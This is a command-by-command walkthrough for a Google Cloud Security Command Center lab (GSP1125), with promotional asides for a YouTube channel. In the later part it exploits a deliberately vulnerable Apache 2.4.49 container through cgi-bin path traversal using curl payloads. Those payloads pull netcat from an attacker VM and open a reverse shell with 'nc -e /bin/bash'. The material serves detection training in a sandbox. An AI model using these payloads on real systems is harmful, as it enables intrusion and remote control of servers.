
# Detect and Investigate Threats with Security Command Center [GSP1125]

# If you consider that the video helped you to complete your lab, so please do like and subscribe [Techcps](https://www.youtube.com/@techcps)

## Note: Go to "IAM & Admin" > "Audit Logs".
* Click the findbar and type: "Cloud Resource Manager API"

* Click the checkbox on "Cloud Resource Manager API" and select "Admin Read" then click save button.

## In the GCP Console open the Cloud Shell and enter the following commands:

```
export ZONE=us-central1-c
REGION=${ZONE::-2}

gcloud services enable securitycenter.googleapis.com --project=$DEVSHELL_PROJECT_ID
sleep 30

gcloud projects add-iam-policy-binding $DEVSHELL_PROJECT_ID \
--member=user:demouser1@gmail.com --role=roles/bigquery.admin

gcloud projects remove-iam-policy-binding $DEVSHELL_PROJECT_ID \
--member=user:demouser1@gmail.com --role=roles/bigquery.admin

gcloud projects add-iam-policy-binding $DEVSHELL_PROJECT_ID \
  --member=user:$USER_EMAIL \
  --role=roles/cloudresourcemanager.projectIamAdmin

gcloud compute instances create instance-1 --project=$DEVSHELL_PROJECT_ID --zone=$ZONE --machine-type=e2-medium --network-interface=network-tier=PREMIUM,stack-type=IPV4_ONLY,subnet=default --metadata=enable-oslogin=true --maintenance-policy=MIGRATE --provisioning-model=STANDARD --scopes=https://www.googleapis.com/auth/cloud-platform --create-disk=auto-delete=yes,boot=yes,device-name=instance-1,image=projects/debian-cloud/global/images/debian-11-bullseye-v20230912,mode=rw,size=10,type=projects/$DEVSHELL_PROJECT_ID/zones/$ZONE/diskTypes/pd-balanced --no-shielded-secure-boot --shielded-vtpm --shielded-integrity-monitoring --labels=goog-ec-src=vm_add-gcloud --reservation-affinity=any

gcloud dns --project=$DEVSHELL_PROJECT_ID policies create dns-test-policy --description="Please subscirbe to techcps" --networks="default" --private-alternative-name-servers="" --no-enable-inbound-forwarding --enable-logging

sleep 45
```


```
gcloud compute ssh --zone "$ZONE" "instance-1" --tunnel-through-iap --project "$DEVSHELL_PROJECT_ID" --quiet --command "gcloud projects get-iam-policy \$(gcloud config get project) && curl etd-malware-trigger.goog"
```
## Note: Check the progress on task 1 & 2
* Do not move until you get score on tast 1 & 2

```
gcloud compute instances delete instance-1 --zone=$ZONE --quiet
```

```
gcloud compute instances create attacker-instance \
--scopes=cloud-platform  \
--zone=$ZONE \
--machine-type=e2-medium  \
--image-family=ubuntu-2004-lts \
--image-project=ubuntu-os-cloud \
--no-address


gcloud compute networks subnets update default \
--region=$REGION \
--enable-private-ip-google-access
sleep 45
gcloud compute ssh --zone "$ZONE" "attacker-instance" --quiet
```

## Note: Go to Task 5 & Copy the IP address

```
Task_5_IP_address=
```

```
export ZONE=us-central1-c

sudo snap remove google-cloud-cli

curl -O https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-cli-438.0.0-linux-x86_64.tar.gz

tar -xf google-cloud-cli-438.0.0-linux-x86_64.tar.gz

./google-cloud-sdk/install.sh
```

```
. ~/.bashrc

gcloud components install kubectl gke-gcloud-auth-plugin --quiet

gcloud container clusters create test-cluster \
--zone "$ZONE" \
--enable-private-nodes \
--enable-private-endpoint \
--enable-ip-alias \
--num-nodes=1 \
--master-ipv4-cidr "172.16.0.0/28" \
--enable-master-authorized-networks \
--master-authorized-networks "$Task_5_IP_address="
sleep 45

while true; do
    output=$(kubectl describe daemonsets container-watcher -n kube-system)
    if [[ $output == *container-watcher-unique-id* ]]; then
        echo "Found unique ID in the output:"
        echo "$output"
        break
    else
        echo "Please like share & subscirbe to techcps / If you're cricketlover then follow cricetcps"
        sleep 15
    fi
done
```

## Note: This command will take a few minutes to display the output

* After Getting a Output run the following Command

```
kubectl create deployment apache-deployment \
--replicas=1 \
--image=us-central1-docker.pkg.dev/cloud-training-prod-bucket/scc-labs/ktd-test-httpd:2.4.49-vulnerable

kubectl expose deployment apache-deployment \
--name apache-test-service  \
--type NodePort \
--protocol TCP \
--port 80


NODE_IP=$(kubectl get nodes -o jsonpath={.items[0].status.addresses[0].address})
NODE_PORT=$(kubectl get service apache-test-service \
-o jsonpath={.spec.ports[0].nodePort})


gcloud compute firewall-rules create apache-test-service-fw \
--allow tcp:${NODE_PORT}

gcloud compute firewall-rules create apache-test-rvrs-cnnct-fw --allow tcp:8888
```
```
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; id"

curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; ls -l /"

curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; hostname"

gsutil cp \
gs://cloud-training/gsp1125/netcat-traditional_1.10-41.1_amd64.deb .
mkdir netcat-traditional
dpkg --extract netcat-traditional_1.10-41.1_amd64.deb netcat-traditional

LOCAL_IP=$(ip -4 addr show ens4 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
echo ${LOCAL_IP}

python3 -m http.server --bind ${LOCAL_IP} \
--directory ~/netcat-traditional/bin/ 8888 &
```

```
curl http://${LOCAL_IP}:8888

curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" --path-as-is --insecure --data "echo Content-Type: text/plain; echo; curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc"

curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; chmod +x /tmp/nc"

```

```
pkill python
```

```
lsof -i -sTCP:LISTEN

curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; /tmp/nc"
```

## Note: Open the new terminal

```
nc -nlvp 8888
```

## Note: Go back first terminal

```
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" --path-as-is --insecure --data "echo Content-Type: text/plain; echo; /tmp/nc ${LOCAL_IP} 8888 -e /bin/bash"
```

## Note: Go back to second terminal

```
ls -l /
```

# Congratulations, you're all done with the lab 😄

# Thanks for watching :)
